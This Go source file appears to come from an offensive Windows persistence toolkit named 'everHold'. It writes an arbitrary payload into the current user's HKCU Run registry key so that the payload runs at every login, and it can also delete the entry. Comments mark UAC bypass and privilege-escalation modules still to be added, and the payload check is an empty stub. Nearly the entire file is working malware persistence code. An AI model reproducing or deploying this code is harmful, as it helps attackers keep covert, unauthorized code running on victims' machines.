package persist

import (
	"everHold/src/conf"
	"everHold/src/utils"
	"fmt"

	"golang.org/x/sys/windows/registry"
)

func Callmethod2(newcmd *conf.RUNCMD) bool {
	method2 := conf.PersistMethodInfo{
		Description:     "Persistence using HKCU run key",
		Method:          "Registry key (HKCU Run) manipulation",
		Id:              "2",
		Type:            "Persistence",
		System:          false,
		Admin:           false,
		FunctionName:    "persistMethod2",
		FunctionPayload: true,
	}
	if method2.Admin == false && method2.System == false {
		result := hkcuRun(newcmd.PayloadValue, newcmd.NameValue, newcmd.AddValue)
		return result
	} else if method2.Admin == true && method2.System == false {
		//涉及UAC bypass模块
		return false
	} else if method2.Admin == true && method2.System == true {
		//涉及UAC bypass+提权模块
		return false
	} else {
		return false
	}
}

func hkcuRun(payload string, name string, add bool) bool {
	if add {
		if validPayload := payloadsExe(payload); validPayload != "" {
			k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
			if err != nil {
				utils.PrintError("Unable to install persistence")
				return false
			}
			defer k.Close()

			err = k.SetStringValue(name, validPayload)
			if err != nil {
				utils.PrintError("Unable to install persistence")
				return false
			}

			utils.PrintSuccess(fmt.Sprintf("Successfully created %s key containing payload (%s)", name, validPayload))
			utils.PrintSuccess("Successfully installed persistence, payload will run at login")
		} else {
			utils.PrintError("Cannot proceed, invalid payload")
			return false
		}
	} else {
		k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
		if err != nil {
			utils.PrintError("Unable to remove persistence")
			return false
		}
		defer k.Close()

		err = k.DeleteValue(name)
		if err != nil {
			utils.PrintError("Unable to remove persistence")
			return false
		}

		utils.PrintSuccess("Successfully removed persistence")
	}
	return true
}

func payloadsExe(payload string) string {
	// Add your payload validation logic here
	// If the payload is valid, return the payload itself
	// If the payload is invalid, return an empty string
	return payload
}
